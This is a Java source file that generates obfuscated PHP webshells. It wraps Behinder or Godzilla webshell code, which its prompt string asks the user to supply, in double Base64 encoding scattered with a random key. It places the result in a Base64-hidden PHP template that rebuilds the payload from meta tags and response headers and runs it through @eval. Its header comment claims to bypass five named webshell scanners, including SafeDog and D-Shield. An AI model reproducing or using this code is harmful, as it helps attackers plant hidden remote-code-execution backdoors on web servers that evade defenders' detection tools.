package encode;

import application.RandomString;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo3 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;
    String meta;

    public PhpEncodeDemo3() {
    }

    public PhpEncodeDemo3(String tamplate, String key, String sourcecode) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = sourcecode;
    }

    public static String GetDemotxt(){

        return  "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-09-05_demo3\n" +
                " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                " * 传参: /xxxx.php?token=xxxxxxxxxxxxxxxxxx\n" +
                " */";
    }

    public String[] Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);
                String s = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(s);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                s = stringBuilder.toString();


                String demo3 = "PD9waHAgLyo8bWV0YSBuYW1lPSIkbWV0YSQiIGNvbnRlbnQ9IiRrZXkkIj4qLwokcGFzc3dvcmQ9JyRiYXNlNjRjb2RlJCc7CiR1c2VybmFtZSA9IGdldF9tZXRhX3RhZ3MoX19GSUxFX18pWyRfR0VUWyd0b2tlbiddXTsKaGVhZGVyKCdDb250ZW50LVR5cGU6dGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgnKTsKaGVhZGVyKCJkZGRkZGRkOiIuJHVzZXJuYW1lKTsKJGFyciA9IGFwYWNoZV9yZXNwb25zZV9oZWFkZXJzKCk7CiR0ZW1wbGF0ZV9zb3VyY2U9Jyc7CmZvcmVhY2ggKCRhcnIgYXMgJGsgPT4gJHYpIHsKICAgIGlmICgka1swXSA9PSAnZCcgJiYgJGtbNV0gPT0gJ2QnKSB7CiAgICAgICAgJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR2LCcnLCRwYXNzd29yZCk7CiAgICB9fQokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiRrZXkgPSAndGVtcGxhdGVfc291cmNlJzsKJGFlc19kZWNvZGVbMV09JCRrZXk7CkBldmFsKCRhZXNfZGVjb2RlWzFdKTs=";
                encode = new String(Base64.getDecoder().decode(demo3));

                this.meta = RandomString.getRString(6);
                encode = encode.replace("$meta$",this.meta);
                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",s);

                demotxt = "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-09-05_demo3\n" +
                        " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                        " * 传参: /xxxx.php?token="+this.meta.toLowerCase()+"\n" +
                        " */";
                return new String[]{this.encode,this.demotxt};
            }catch (Exception e){
                return new String[]{"加密失败",this.demotxt};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉php源码", this.demotxt};
        }
    }
}
